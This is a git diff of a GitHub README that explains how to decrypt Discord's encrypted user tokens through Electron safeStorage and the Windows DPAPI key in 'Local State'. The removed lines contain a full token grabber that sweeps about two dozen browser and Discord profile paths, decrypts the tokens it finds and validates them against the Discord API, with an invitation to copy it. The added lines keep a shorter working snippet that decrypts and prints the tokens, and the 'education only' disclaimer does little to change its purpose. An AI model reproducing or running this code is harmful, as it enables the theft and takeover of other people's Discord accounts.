@@ -1,36 +1,44 @@
 # Token-encryption-writeup
 All the info's about token encryption in one repository
+![enc](https://user-images.githubusercontent.com/104512346/188005029-78d67d63-307c-4fce-adba-7579685e7c62.png)
 
+<br>
+So, as we all know, Discord recently started encrypting User-tokens. I had them decrypted in under a day but kept it secret for a while. Now that I already shared it with friends, lets just share it with everyone
 
-So, as we all know, Discord recently started encrypting User-tokens. I had them decrypted in under a day but kept it secret. Now that they termed me once again, here we are. I'll publish the exact changes, new regex & decryption.
+----
+<br><br>
+# How they do it:
 
-----------------------------------------------------------------------------------------------------
-So, Discords new Token encryption is based off of the "Electron SafeStorage API". If you heard of that before, you can literally just leave now as u know how to decrypt the new tokens lol. If not, heres the new stuff:
+Discord uses the so-called "safeStorage API" - an API provided by electron to interact with LocalStorage in a secure manner, including encryption. For more info on that, check out his <a href="https://www.electronjs.org/docs/latest/api/safe-storage">link</a>
 
+Its really simple to get the Token with this:
+
+- Find the key-file ("current_dir\\Local State")
+- Grab the key
+- Grab your encrypted Token using regex
+- Use base64 & the aes-module to decrypt it. 
+
+----
+<br><br>
+
+# How this looks like in code
+
+- Import our modules and define our regex:
 ```py
 import requests
 import os
 import json 
 import base64
 from re import findall
-from Cryptodome.Cipher import AES # New import 1, AES / also works with from Crypto.Cipher import AES, remember crypto and cryptodrome are pretty same module
+from Cryptodome.Cipher import AES # New import 1, AES
 from win32crypt import CryptUnprotectData # New import 2, win32crypt
 
-appdata = os.getenv("localappdata")
-roaming = os.getenv("appdata")
-regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" # new token regex tbw
+roaming = os.getenv("appdata") # Appdata
 encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex
+```
 
-
-def getheaders(token=None, content_type="application/json"): # simply getting our headers for token validation
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36" # one of the last agents just in case discord wants to break balls
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-
+- Write your key-functions:
+```py
 def decrypt_payload(cipher, payload): # decrypting our payload, in this case tokens
     return cipher.decrypt(payload)
 
@@ -57,88 +65,39 @@ def get_token_key(path): # token encryption uses a key stored in a different fol
     master_key = master_key[5:] # which we will eventually get after splitting off nonesense
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1] # and using win32crypt
     return master_key # boom, key
-
-# Below is a token grabber using it, feel free to skid it, honestly im just mad. make sure to mention "CC/CL" in your code if u copy-paste it :)
-
-def grabTokens():
-    tokens = []
-    paths = {
-        'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
-        'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
-        'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
-        'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-        'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-        'Amigo': appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-        'Torch': appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-        'Kometa': appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-        'Orbitum': appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-        'CentBrowser': appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-        '7Star': appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-        'Sputnik': appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-        'Vivaldi': appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Chrome SxS': appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-        'Chrome': appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Epic Privacy Browser': appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-        'Microsoft Edge': appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Uran': appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Yandex': appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Brave': appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Iridium': appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Firefox': roaming + r'\\Mozilla\\Firefox\\Profiles'
-}
-
-    for source, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        if not "discord" in path: # we first check if its not discord, cuz then we wont need the encryption bs at all and grab it like normal
-            if "Mozilla" in path: # ha, yeah.. firefox needs extra care lmfao.
-                for loc, _, files in os.walk(path):
-                    for _file in files:
-                        if not _file.endswith('.sqlite'):
-                            continue
-                        for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                            for token in findall(regex, line):
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokens.append(token)
-
-            else: # If its not firefox
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                            if r.status_code == 200:
-                                if token in tokens:
-                                    continue
-                                tokens.append(token)
-       
-
-        else:
-            for file_name in os.listdir(path): # if it is discord...
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
-                    for y in findall(encrypted_regex, line): # and find our encrypted regex
-                        for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs, because all local state files are same for an user, even the discord client is different
-                            if os.path.isfile(ROAMING+ f'\\{i}\\Local State'): # to avoid error if victim doesn't hav discordcanary for example (file not found..)
-                                token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokens.append(token)
-                                                    
-
 ```
 
-Enjoy, kids
+- Load the Discord Paths and grab the token:
+```py
+paths = {
+'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
+'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\'
+}
 
+for path in paths:
+    for file_name in os.listdir(path): # if it is discord...
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
+            continue
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
+            for y in findall(encrypted_regex, line): # and find our encrypted regex
+                for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs
+                    try:
+                        token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
+                    except:
+                        pass
+                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
+                    if r.status_code == 200:
+                        if token in tokens:
+                            continue
+                        print(token)
+```
 
-Sincerely,
-CC/CL
+Thats all there is to do, lol
+
+----
+<br><br>
+# Legal Disclaimer:
+<br>
+Please keep in mind that this is not meant for illegal purposes! This is for education only. It exists to show how broken the Discord API & their Client is. I am not liable for anything you decide to do with this, and you agree to not use it for anything illegal.
